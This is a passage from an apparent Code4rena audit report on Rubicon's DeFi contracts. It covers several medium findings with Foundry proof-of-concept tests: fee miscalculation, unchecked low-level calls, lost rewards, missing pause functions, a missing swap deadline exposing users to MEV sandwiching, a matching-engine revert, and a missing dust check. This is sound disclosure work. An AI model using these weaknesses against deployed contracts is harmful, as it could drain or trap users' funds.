    // Alice has 30k USDC, bob has 1 BTC
    USDC.mint(alice, 30_000 ether);
    BTC.mint(bob, 1 ether);

    // Alice creates the offer to sell USDC for BTC
    vm.prank(alice);
    USDC.approve(address(market), type(uint256).max);
    vm.prank(alice);
    bytes32 id = market.make(
        USDC, // pay
        BTC, // buy
        30_000 ether, // pay_amount
        1 ether // buy_amount
    );

    // Bob trades his BTC for USDC
    vm.prank(bob);
    BTC.approve(address(market), type(uint256).max);
    vm.prank(bob);
    market.buy(uint256(id), 30_000 ether);

    console.log("Bob BTC balance:", BTC.balanceOf(bob));
}
```

### Recommendation

The correct calculation for the fee inclusivity amount should be as follows:

    result = amount / (100% + protocol fee + maker fee)

For the example given in the previous section, this would result in an amount of `1000 / (100% + 10% + 5%) = 869`.

**[daoio (Rubicon) confirmed](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1312#issuecomment-1532482649)**

**[HickupHH3 (judge) commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1312#issuecomment-1562701037):**
 > There are so many things wrong with the fee calculation and accounting that it's difficult for me to properly separate the issues (and numerous proposed mitigations to the point I get confused on what the best way forward is).
> 
> I'm going to leave all issues regarding fee inclusivity & incorrect calculation with `calcAmountAfterFee()` in this one.
> 
> [#282](https://github.com/code-423n4/2023-04-rubicon-findings/issues/282) deals with fee accounting issues in `_marketBuy()` and `_marketSell()`.

**[HickupHH3 (judge) commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1312#issuecomment-1562916710):**
 > Out of all the reports I've seen, this one explains the issue on incorrect fee calculation the best in my opinion, with effects on the protocol and maker fee receiving less than expected.
> 
> The correct formula for fee inclusivity that's been mathematically proven is here: https://github.com/code-423n4/2022-05-rubicon-findings/issues/104.
> 
> So the calculated amount should be: `amount - (marketFee + protocolFee) * amount / (BPS + marketFee + protocolFee)`.
> 
> In my example, I'm using `BPS = 10k`, I know the impl uses a non-conventional 100k instead.
> - `marketFee` = `500` = 5%
> - `protocolFee` = `1000` = 10%
> 
> Expected amount after fees = `1000 - (1000 + 500) * 1000 / (10_000 + 1000 + 500) = 869`.

***

## [[M-02] Low level calls to accounts with no code will succeed in `FeeWrapper`](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1298)
*Submitted by [adriro](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1298), also found by [Udsen](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1381), [oualidpro](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1379), [descharre](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1378), [Rolezn](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1375), [immeas](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1203), [Breeje](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1159), [jasonxiale](https://github.com/code-423n4/2023-04-rubicon-findings/issues/978) and [zaevlad](https://github.com/code-423n4/2023-04-rubicon-findings/issues/252)*.

The `FeeWrapper` contract wraps calls to an arbitrary target contract to add support for fees. The implementation executes a low level call to proxy the call to the target contract. This can be seen in the `_rubicall` and `_rubicallPayable` functions:

<https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L60-L73>

```solidity
60:     function _rubicall(
61:         CallParams memory _params
62:     ) internal returns (bytes memory) {
63:         // charge fee from feeParams
64:         _chargeFee(_params.feeParams, _params.target);
65: 
66:         (bool _OK, bytes memory _data) = _params.target.call(
67:             bytes.concat(_params.selector, _params.args)
68:         );
69: 
70:         require(_OK, "low-level call to the Rubicon failed");
71: 
72:         return _data;
73:     }
```

<https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L76-L89>

```solidity
76:     function _rubicallPayable(
77:         CallParams memory _params
78:     ) internal returns (bytes memory) {
79:         // charge fee from feeParams
80:         uint256 _msgValue = _chargeFeePayable(_params.feeParams);
81: 
82:         (bool _OK, bytes memory _data) = _params.target.call{value: _msgValue}(
83:             bytes.concat(_params.selector, _params.args)
84:         );
85: 
86:         require(_OK, "low-level call to the router failed");
87: 
88:         return _data;
89:     }
```

Low level calls behave differently than function calls in Solidity. Calls at the EVM level to accounts with no code are successful, this is the expected and normal behavior. It is Solidity that adds checks to prevent accidental calls to accounts with no code while compiling code for normal function calls.

This means that if the target account has no code, then the wrapped call using the `FeeWrapper` contract will succeed and the operation will be executed successfully. An accidental mistake may go unnoticed and may also cause unexpected loss of funds, as this call may include call value for transferring ETH.

### Proof of Concept

In the following test, we use the `FeeWrapper` contract to execute a call to an account with no code. The transaction will succeed and the ETH will be transferred to the target account.

*Note: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/f3b7d6f9ab043340de7deb67a9c515e5).*

```solidity
function test_FeeWrapper_CallsToAccountsNoCodeSucceed() public {
    FeeWrapper.CallParams memory callParams;
    callParams.selector = bytes4(0x01020304);
    callParams.args = abi.encode(uint256(42));
    callParams.target = makeAddr("address with no code");
    callParams.feeParams.totalAmount = 0.1 ether;
    callParams.feeParams.feeAmount = 0.01 ether;
    callParams.feeParams.feeTo = makeAddr("FeeRecipient");

    // Target has no code
    assertEq(callParams.target.code.length, 0);

    // Call succeeds even though the target has no code and no implementation
    feeWrapper.rubicall{value: 0.1 ether}(callParams);
}
```

### Recommendation

While executing low level calls, the `_rubicall` and `_rubicallPayable` functions should check that either the account has code or the return data is greater than zero (which indicates the presence of an implementation). The OpenZeppelin contracts library provides utilities to execute low level calls in a safe way, including the recommended checks, present in the Address library, [functionCall](https://docs.openzeppelin.com/contracts/4.x/api/utils#Address-functionCall-address-bytes-) and [functionCallWithValue](https://docs.openzeppelin.com/contracts/4.x/api/utils#Address-functionCallWithValue-address-bytes-uint256-).

**[daoio (Rubicon) confirmed](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1298#issuecomment-1532492789)**

**[HickupHH3 (judge) commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1298#issuecomment-1562604321):**
 > Value lost would be `msg.value`, preventing it has a low cost, sticking to Medium.
> Reference [here](https://github.com/code-423n4/org/issues/53#issuecomment-1340685618).

***

## [[M-03] Rewards for initial period may be lost in `BathBuddy` contract](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1295)
*Submitted by [adriro](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1295)*.

Rewards in the `BathBuddy` contract are initiated when the owner calls the `notifyRewardAmount`. This function calculates the reward rate per second (lines 196-198 and 207-208) and also records the start of the reward period (line 223):

<https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L191-L228>

```solidity
191:     function notifyRewardAmount(
192:         uint256 reward,
193:         IERC20 rewardsToken
194:     ) external onlyOwner updateReward(address(0), address(rewardsToken)) {
195:         if (block.timestamp >= periodFinish[address(rewardsToken)]) {
196:             rewardRates[address(rewardsToken)] = reward.div(
197:                 rewardsDuration[address(rewardsToken)]
198:             );
199:         } else {
200:             uint256 remaining = periodFinish[address(rewardsToken)].sub(
201:                 block.timestamp
202:             );
203:             uint256 leftover = remaining.mul(
204:                 rewardRates[address(rewardsToken)]
205:             );
206:             rewardRates[address(rewardsToken)] = reward.add(leftover).div(
207:                 rewardsDuration[address(rewardsToken)]
208:             );
209:         }
210: 
211:         // Ensure the provided reward amount is not more than the balance in the contract.
212:         // This keeps the reward rate in the right range, preventing overflows due to
213:         // very high values of rewardRate in the earned and rewardsPerToken functions;
214:         // Reward + leftover must be less than 2^256 / 10^18 to avoid overflow.
215:         // Note********** ERC20s must be here*************
216:         uint256 balance = rewardsToken.balanceOf(address(this));
217:         require(
218:             rewardRates[address(rewardsToken)] <=
219:                 balance.div(rewardsDuration[address(rewardsToken)]),
220:             "Provided reward too high"
221:         );
222: 
223:         lastUpdateTime[address(rewardsToken)] = block.timestamp;
224:         periodFinish[address(rewardsToken)] = block.timestamp.add(
225:             rewardsDuration[address(rewardsToken)]
226:         );
227:         emit RewardAdded(reward);
228:     }
```

The intention here is to calculate how many tokens should be rewarded by unit of time (second) and record the span of time for the reward cycle. However, this has an edge case where rewards are not counted for the initial period of time until there is at least one participant (in this case, a holder of `BathTokens`). During this initial period of time, the reward rate will still apply but as there isn't any participant, then no one will be able to claim these rewards. See PoC for a detailed example of the issue.

### Proof of Concept

In the following test, we initiate the reward process by calling `notifyRewardAmount`. At the middle of the duration process, we mint `BathTokens` to Alice to represent her participation. At the end of the duration process, after Alice claims her rewards, half of them will still be held in the `BathBuddy` contract.

*Note: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/f3b7d6f9ab043340de7deb67a9c515e5).*

```solidity
function test_BathBuddy_RewardsLostForInitialPeriod() public {
    // Setup rewards
    uint256 startTime = block.timestamp;
    uint256 duration = 10_000 seconds;
    vm.prank(bathBuddyOwner);
    bathBuddy.setRewardsDuration(duration, address(rewardToken));

    uint256 rewardAmount = 100 ether;
    rewardToken.mint(address(bathBuddy), rewardAmount);
    vm.prank(bathBuddyOwner);
    bathBuddy.notifyRewardAmount(rewardAmount, rewardToken);

    // Simulate half of the duration time passes
    vm.warp(startTime + duration / 2);

    // Trigger updateRewards to update state
    vm.prank(bathBuddyHouse);
    bathBuddy.getReward(rewardToken, address(0));

    // Mint bathTokens to Alice
    uint256 bathTokenAmount = 1 ether;
    bathToken.mint(alice, bathTokenAmount);

    // Simulate complete duration time passes
    vm.warp(startTime + duration);

    // Trigger getRewards for Alice
    vm.prank(bathBuddyHouse);
    bathBuddy.getReward(rewardToken, alice);

    // Alice will only get half of the rewards. The other half will be stuck in the contract.
    assertEq(rewardToken.balanceOf(alice), rewardAmount / 2);
    assertEq(rewardToken.balanceOf(address(bathBuddy)), rewardAmount / 2);
}
```

### Recommendation

A possible solution to the issue would be to set the start and end time for the current reward cycle when the first participant joins the reward program, i.e. when the total supply is greater than zero, instead of starting the process in the `notifyRewardAmount`.

### References

The following reports can be used as a reference for the described issue:

*   <https://0xmacro.com/blog/synthetix-staking-rewards-issue-inefficient-reward-distribution/>
*   <https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/93>

**[daoio (Rubicon) confirmed](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1295#issuecomment-1536276661)**

***

## [[M-04] `BathBuddy` contract should implement methods to pause and unpause contract](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1286)
*Submitted by [adriro](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1286), also found by [brgltd](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1385), [0xnacho](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1376), [zhuXKET](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1327), [Ace-30](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1037), [ddimitrov22](https://github.com/code-423n4/2023-04-rubicon-findings/issues/922), [markus\_ether](https://github.com/code-423n4/2023-04-rubicon-findings/issues/893), [AlexCzm](https://github.com/code-423n4/2023-04-rubicon-findings/issues/804), [qbs](https://github.com/code-423n4/2023-04-rubicon-findings/issues/673), [luciana](https://github.com/code-423n4/2023-04-rubicon-findings/issues/639), [juancito](https://github.com/code-423n4/2023-04-rubicon-findings/issues/527), [said](https://github.com/code-423n4/2023-04-rubicon-findings/issues/431), [cccz](https://github.com/code-423n4/2023-04-rubicon-findings/issues/336), [bytes032](https://github.com/code-423n4/2023-04-rubicon-findings/issues/299) and [T1MOH](https://github.com/code-423n4/2023-04-rubicon-findings/issues/288)*.

The `BathBuddy` contract inherits from OpenZeppelin `Pausable` contract with the intention of adding pausing features to the contract.

<https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L38>

```solidity
38: contract BathBuddy is ReentrancyGuard, IBathBuddy, Pausable {
```

The [`Pausable` implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/Pausable.sol) contains all the logic to implement pausing, but doesn't include any external or public functionality to actually trigger the pause or resume, this task is left to the derived contract.

The `BathBuddy` contract fails to implement these functions, as there is no callable function from the outside that modifies the pause state. The pausing mechanism is intended to be used in the `getReward` function, as this function includes the `whenNotPaused`:

<https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L168-L185>

```solidity
168:     function getReward(
169:         IERC20 rewardsToken,
170:         address holderRecipient
171:     )
172:         external
173:         override
174:         nonReentrant
175:         whenNotPaused
176:         updateReward(holderRecipient, address(rewardsToken))
177:         onlyBathHouse
178:     {
179:         uint256 reward = tokenRewards[address(rewardsToken)][holderRecipient];
180:         if (reward > 0) {
181:             tokenRewards[address(rewardsToken)][holderRecipient] = 0;
182:             rewardsToken.safeTransfer(holderRecipient, reward);
183:             emit RewardPaid(holderRecipient, reward);
184:         }
185:     }
```

This means that protocol admin won't be able to pause this function if needed as there is no accessible function to enable the mechanism at all.

### Proof of Concept

The `BathBuddy` contract code doesn't include any external or public function to pause or resume the contract. The OpenZeppelin implementations only contains internal functions to provide support so that the derived contract implements the public interface:

<https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/Pausable.sol#L82-L104>

```solidity
/**
  * @dev Triggers stopped state.
  *
  * Requirements:
  *
  * - The contract must not be paused.
  */
function _pause() internal virtual whenNotPaused {
    _paused = true;
    emit Paused(_msgSender());
}

/**
  * @dev Returns to normal state.
  *
  * Requirements:
  *
  * - The contract must be paused.
  */
function _unpause() internal virtual whenPaused {
    _paused = false;
    emit Unpaused(_msgSender());
}
```

### Recommendation

The `BathBuddy` contract should implement the functions to expose the pausing mechanism. These functions should only be accessible to the owner of the contract.

```solidity
function pause() external onlyOwner {
    _pause();
}

function unpause() external onlyOwner {
    _unpause();
}
```

**[daoio (Rubicon) confirmed](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1286#issuecomment-1532511273)**

***

## [[M-05] No deadline parameter in `sellAllAmount()` and `buyAllAmount()` functions:](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1257)
*Submitted by [nirlin](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1257), also found by [sayan](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1026)*.

There is no deadline parameter in these two functions. This missing feature enables pending transactions to be maliciously executed at a later point.

### Proof of Concept

Consider following scnerio:

1.  Alice wants to create order of 1000DAI for 1 ETH . She signs the transaction with  `minOutputAmount = 0.99 ETH` to allow for some slippage.
2. The transaction is submitted to the mempool; however, Alice chose a transaction fee that is too low for miners to be interested in including her transaction in a block. The transaction stays pending in the mempool for extended periods, which could be hours, days, weeks, or even longer.
3. The average gas fee dropped far enough for Alice's transaction to become interesting again for miners to include it. In the meantime, the price of ETH could have drastically changed. She will still at least get 0.99 ETH due to `minOutputAmount`, but the DAI value of that output might be significantly lower. She has unknowingly performed a bad trade due to the pending transaction she forgot about.

An even worse way this issue can be maliciously exploited is through MEV:

1.  The swap transaction is still pending in the mempool. Average fees are still too high for miners to be interested in it. The price of `___` has gone up significantly since the transaction was signed (lets say its not dai now and some other token), meaning Alice would receive a lot more ETH when the swap is executed. But that also means that her `minOutputAmount` value is outdated and would allow for significant slippage.
2.  A MEV bot detects the pending transaction. Since the outdated `minOutputAmount` now allows for high slippage, the bot sandwiches Alice, resulting in significant profit for the bot and significant loss for Alice.

### Recommended Mitigation Steps

Add deadline param

**[bghughes (Rubicon) disputed, disagreed with severity and commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1257#issuecomment-1533496094):**
 > In my opinion, this is a good recommendation but is OOS.<br>
 > Due to MEV argument - seems network-level to me - nice enhancement idea though.

**[HickupHH3 (judge) commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1257#issuecomment-1562647818):**
 > Ignoring the MEV argument since we're dealing with L2s.
> 
> I think the first portion has some merit. Reference [here](https://code4rena.com/reports/2022-06-canto-v2/#m-01-stableswap---deadline-do-not-work).
> > Because front-running is a key aspect of AMM design, deadline is a useful tool to ensure that your tx cannot be “saved for later”.
> 
> While both Arbitrum & Optimism has minimum gas prices, network congestion could mean that the tx doesn't get mined until they go back down (eg. trading during Arb airdrop).
> 
> It's again a user-conditional error, which, following the reasoning in [#1298](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1298), would be medium severity.

***

## [[M-06] The ````_matcho()```` is not implemented properly](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1243)
*Submitted by [KingNFT](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1243), also found by [zhuXKET](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1336) and [0xDING99YA](https://github.com/code-423n4/2023-04-rubicon-findings/issues/848)*.

The `_matcho()` function is not implemented properly. It might revert while the taking amount is greater than the best offer's amount, which leads to order a matching failure.

### Proof of Concept

The following test script shows how to trigger the issue:

```solidity
pragma solidity ^0.8.0;

import "../../contracts/compound-v2-fork/WhitePaperInterestRateModel.sol";
import "../../contracts/compound-v2-fork/ComptrollerInterface.sol";
import "../../contracts/compound-v2-fork/CErc20Delegator.sol";
import "../../contracts/compound-v2-fork/CErc20Delegate.sol";
import "../../contracts/compound-v2-fork/Comptroller.sol";
import "../../contracts/utilities/MarketAidFactory.sol";
import "../../contracts/periphery/TokenWithFaucet.sol";
import "../../contracts/utilities/MarketAid.sol";
import "../../contracts/periphery/WETH9.sol";
import "../../contracts/RubiconMarket.sol";
import "forge-std/Test.sol";

/// @notice proxy isn't used here
contract MatchingOfferNotWorking is Test {
  //========================CONSTANTS========================
  address public owner;
  address FEE_TO = 0x0000000000000000000000000000000000000FEE;
  address taker = address(0x1234);
  address maker = address(0x5678);
  // core contracts
  RubiconMarket market;
  // test tokens
  TokenWithFaucet RUBI;
  TokenWithFaucet USDC;

  // deployRubiconProtocolFixture()
  function setUp() public {
    owner = msg.sender;

    // deploy new Market instance and init
    market = new RubiconMarket();
    market.initialize(FEE_TO);
    market.setFeeBPS(10);

    // deploy test tokens
    RUBI = new TokenWithFaucet(address(this), "RUBI", "RUBI", 18);
    USDC = new TokenWithFaucet(address(this), "Test Stablecoin", "USDC", 6);

    // add some $$$ to victim and attacker
    RUBI.faucet();
    USDC.faucet();
    RUBI.transfer(maker, 1000e18);
    USDC.transfer(taker, 10000e6);

    vm.startPrank(taker);
    USDC.approve(address(market), type(uint256).max);
    vm.stopPrank();

    vm.startPrank(maker);
    RUBI.approve(address(market), type(uint256).max);
    vm.stopPrank();
  }

  //========================MARKET_TESTS========================

  function test_MatchingOfferNotWorking() public {
   // 1. maker submits an offer for selling 1 RUBI at 100 USDC/RUBI
    uint256 makerRubiBalanceBefore = RUBI.balanceOf(maker);
    vm.startPrank(maker);
    uint256 id = market.offer(1e18, RUBI, 100e6, USDC); 
    vm.stopPrank();
    assertGt(id, 0);
    uint256 makerRubiBalanceAfter = RUBI.balanceOf(maker);
    assertEq(makerRubiBalanceBefore - makerRubiBalanceAfter, 1e18);
    
    // 2. now the taker submits another offer for buying 10 RUBI at 100 USDC/RUBI
    //    we expect the above selling offer to be fulfilled successfully.
    //    Meanwhile, a new 9 RUBI buying offer should be created,
    //    but actually the this offer will be reverted.
    vm.startPrank(taker);
    // buying RUBI/USDC at 100 USDC/RUBI
    vm.expectRevert();
    id = market.offer(1000e6, USDC, 10e18, RUBI); 
    vm.stopPrank();
  }

}

```

And the log details:

```solidity
Running 1 test for test/foundry-tests/MatchingOfferNotWorking.t.sol:MatchingOfferNotWorking
[PASS] test_MatchingOfferNotWorking() (gas: 422566)
Traces:
  [422566] MatchingOfferNotWorking::test_MatchingOfferNotWorking()
    ├─ [2629] TokenWithFaucet::balanceOf(0x0000000000000000000000000000000000005678) [staticcall]
    │   └─ ← 1000000000000000000000
    ├─ [0] VM::startPrank(0x0000000000000000000000000000000000005678)
    │   └─ ← ()
    ├─ [246628] RubiconMarket::offer(1000000000000000000, TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 100000000, TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a])
    │   ├─ [30321] TokenWithFaucet::transferFrom(0x0000000000000000000000000000000000005678, RubiconMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000005678, to: RubiconMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1000000000000000000)
    │   │   └─ ← true
    │   ├─ emit LogItemUpdate(id: 1)
    │   ├─ emit emitOffer(id: 0x0000000000000000000000000000000000000000000000000000000000000001, pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148, maker: 0x0000000000000000000000000000000000005678, pay_gem: TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], buy_gem: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], pay_amt: 1000000000000000000, buy_amt: 100000000)
    │   ├─ emit LogSortedOffer(id: 1)
    │   └─ ← 1
    ├─ [0] VM::stopPrank()
    │   └─ ← ()
    ├─ [629] TokenWithFaucet::balanceOf(0x0000000000000000000000000000000000005678) [staticcall]
    │   └─ ← 999000000000000000000
    ├─ [0] VM::startPrank(0x0000000000000000000000000000000000001234)
    │   └─ ← ()
    ├─ [0] VM::expectRevert()
    │   └─ ← ()
    ├─ [167743] RubiconMarket::offer(1000000000, TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 10000000000000000000, TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b])
    │   ├─ [32321] TokenWithFaucet::transferFrom(0x0000000000000000000000000000000000001234, 0x0000000000000000000000000000000000000FEE, 9999)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000001234, to: 0x0000000000000000000000000000000000000FEE, value: 9999)
    │   │   └─ ← true
    │   ├─ [25521] TokenWithFaucet::transferFrom(0x0000000000000000000000000000000000001234, 0x0000000000000000000000000000000000005678, 99990000)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000001234, to: 0x0000000000000000000000000000000000005678, value: 99990000)
    │   │   └─ ← true
    │   ├─ [24995] TokenWithFaucet::transfer(0x0000000000000000000000000000000000001234, 999900000000000000)
    │   │   ├─ emit Transfer(from: RubiconMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x0000000000000000000000000000000000001234, value: 999900000000000000)
    │   │   └─ ← true
    │   ├─ emit LogItemUpdate(id: 1)
    │   ├─ emit emitTake(id: 0x0000000000000000000000000000000000000000000000000000000000000001, pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148, taker: 0x0000000000000000000000000000000000001234, maker: 0x0000000000000000000000000000000000005678, pay_gem: TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], buy_gem: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], take_amt: 999900000000000000, give_amt: 99990000)
    │   ├─ emit emitFee(id: 0x0000000000000000000000000000000000000000000000000000000000000001, taker: 0x0000000000000000000000000000000000001234, feeTo: 0x0000000000000000000000000000000000000FEE, pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148, asset: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], feeAmt: 9999)
    │   ├─ emit LogMatch(id: 0, amount: 1000000000000000000)
    │   ├─ [3621] TokenWithFaucet::transferFrom(0x0000000000000000000000000000000000001234, 0x0000000000000000000000000000000000000FEE, 0)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000001234, to: 0x0000000000000000000000000000000000000FEE, value: 0)
    │   │   └─ ← true
    │   ├─ [3621] TokenWithFaucet::transferFrom(0x0000000000000000000000000000000000001234, 0x0000000000000000000000000000000000005678, 9999)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000001234, to: 0x0000000000000000000000000000000000005678, value: 9999)
    │   │   └─ ← true
    │   ├─ [3095] TokenWithFaucet::transfer(0x0000000000000000000000000000000000001234, 99990000000000)
    │   │   ├─ emit Transfer(from: RubiconMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x0000000000000000000000000000000000001234, value: 99990000000000)
    │   │   └─ ← true
    │   ├─ emit LogItemUpdate(id: 1)
    │   ├─ emit emitTake(id: 0x0000000000000000000000000000000000000000000000000000000000000001, pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148, taker: 0x0000000000000000000000000000000000001234, maker: 0x0000000000000000000000000000000000005678, pay_gem: TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], buy_gem: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], take_amt: 99990000000000, give_amt: 9999)
    │   ├─ emit emitFee(id: 0x0000000000000000000000000000000000000000000000000000000000000001, taker: 0x0000000000000000000000000000000000001234, feeTo: 0x0000000000000000000000000000000000000FEE, pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148, asset: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], feeAmt: 0)
    │   ├─ emit LogMatch(id: 0, amount: 100000000000000)
    │   └─ ← "EvmError: Revert"
    ├─ [0] VM::stopPrank()
    │   └─ ← ()
    └─ ← ()

Test result: ok. 1 passed; 0 failed; finished in 2.67ms
```

Let's take a look at this line, we find the actual `take_amt` is `0.9999e18 RUBI`, rather than the expected `1e18`; the difference is exact the 0.01% of fee.

```solidity
emit emitTake(id: 0x0000000000000000000000000000000000000000000000000000000000000001,
 pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148,
 taker: 0x0000000000000000000000000000000000001234,
 maker: 0x0000000000000000000000000000000000005678,
 pay_gem: TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b],
 buy_gem: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a],
 take_amt: 999900000000000000, 
give_amt: 99990000)
```

Back to the source code, we can see the issue arises on L1313 of `_matcho()`,  where `m_pay_amt` should be something like `m_pay_amt + fee`.

```solidity
File: contracts\RubiconMarket.sol
1273:     function _matcho(
1274:         uint256 t_pay_amt, //taker sell how much
1275:         ERC20 t_pay_gem, //taker sell which token
1276:         uint256 t_buy_amt, //taker buy how much
1277:         ERC20 t_buy_gem, //taker buy which token
1278:         uint256 pos, //position id
1279:         bool rounding, //match "close enough" orders?
1280:         address owner,
1281:         address recipient
1282:     ) internal returns (uint256 id) {
1283:         uint256 best_maker_id; //highest maker id
1284:         uint256 t_buy_amt_old; //taker buy how much saved
1285:         uint256 m_buy_amt; //maker offer wants to buy this much token
1286:         uint256 m_pay_amt; //maker offer wants to sell this much token
1287: 
1288:         // there is at least one offer stored for token pair
1289:         while (_best[address(t_buy_gem)][address(t_pay_gem)] > 0) {
1290:             best_maker_id = _best[address(t_buy_gem)][address(t_pay_gem)];
1291:             m_buy_amt = offers[best_maker_id].buy_amt;
1292:             m_pay_amt = offers[best_maker_id].pay_amt;
1293: 
...
1313:             buy(best_maker_id, min(m_pay_amt, t_buy_amt));
1314:             emit LogMatch(id, min(m_pay_amt, t_buy_amt));
1315:             t_buy_amt_old = t_buy_amt;
1316:             t_buy_amt = sub(t_buy_amt, min(m_pay_amt, t_buy_amt));
1317:             t_pay_amt = mul(t_buy_amt, t_pay_amt) / t_buy_amt_old;
1318: 
1319:             if (t_pay_amt == 0 || t_buy_amt == 0) {
1320:                 break;
1321:             }
1322:         }
1323: 
...
1341:     }

```

### Recommended Mitigation Steps

See PoC

**[daoio (Rubicon) confirmed via duplicate issue #1336](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1336#issuecomment-1532477082)**

***

## [[M-07] Missing a check for minimum sell amount at the `make` function](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1167)
*Submitted by [Evo](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1167), also found by [said](https://github.com/code-423n4/2023-04-rubicon-findings/issues/597)*.

There is a check for `_dust` amount inside offer function at [L835](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L835)
but not inside the other offer function being called by the `make` function at [L511](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L511).

The `make` function will not avoid dust offers.

### Proof of Concept

<https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L511-L562><br>
There is no check for `_dust` inside offer function. The minimum sell amount should be set for a token to avoid dust offers as the concept applies.

```
    function offer(
        uint256 pay_amt,
        ERC20 pay_gem,
        uint256 buy_amt,
        ERC20 buy_gem,
        address owner,
        address recipient
    ) public virtual can_offer synchronized returns (uint256 id) {
        require(uint128(pay_amt) == pay_amt);
        require(uint128(buy_amt) == buy_amt);
        require(pay_amt > 0);
        require(pay_gem != ERC20(address(0))); /// @dev Note, modified from: require(pay_gem != ERC20(0x0)) which compiles in 0.7.6
        require(buy_amt > 0);
        require(buy_gem != ERC20(address(0))); /// @dev Note, modified from: require(buy_gem != ERC20(0x0)) which compiles in 0.7.6
        require(pay_gem != buy_gem);


        OfferInfo memory info;
        info.pay_amt = pay_amt;
        info.pay_gem = pay_gem;
        info.buy_amt = buy_amt;
        info.buy_gem = buy_gem;
        info.recipient = recipient;
        info.owner = owner;
        info.timestamp = uint64(block.timestamp);
        id = _next_id();
        offers[id] = info;


        require(pay_gem.transferFrom(msg.sender, address(this), pay_amt));


        emit LogItemUpdate(id);


        /// emit LogMake(
        ///     bytes32(id),
        ///     keccak256(abi.encodePacked(pay_gem, buy_gem)),
        ///     msg.sender,
        ///     pay_gem,
        ///     buy_gem,
        ///     uint128(pay_amt),
        ///     uint128(buy_amt),
        ///     uint64(block.timestamp)
        /// );


        emit emitOffer(
            bytes32(id),
